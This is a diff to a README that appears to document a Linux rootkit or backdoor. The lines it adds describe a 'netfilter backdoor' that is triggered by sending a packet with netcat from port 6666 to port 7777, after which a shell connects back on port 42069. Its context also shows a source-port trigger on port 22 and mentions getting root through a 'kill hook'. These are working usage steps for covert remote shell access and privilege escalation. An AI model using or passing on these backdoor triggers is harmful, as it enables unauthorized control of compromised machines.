@@ -13,6 +13,14 @@ To remotely get a shell, send a request from a specified source port (default 13
 ```
 nc xxx.xxx.xxx.xxx 22 -p 1337
 ```
+The shell will be returned on port 42069, so have a listener for that.
+### Netfilter Backdoor
+To remotely get a shell, it is also possible to abuse the netfilter backdoor. Send a packet to port 7777 on
+the target machine from port 6666 on the source machine:
+```
+nc xxx.xxx.xxx.xxx 7777 -p 6666
+```
+The shell will be returned on port 42069, so have a listener for that.
 ### Get root
 When on the machine, root can be acquired via kill hook
 ```
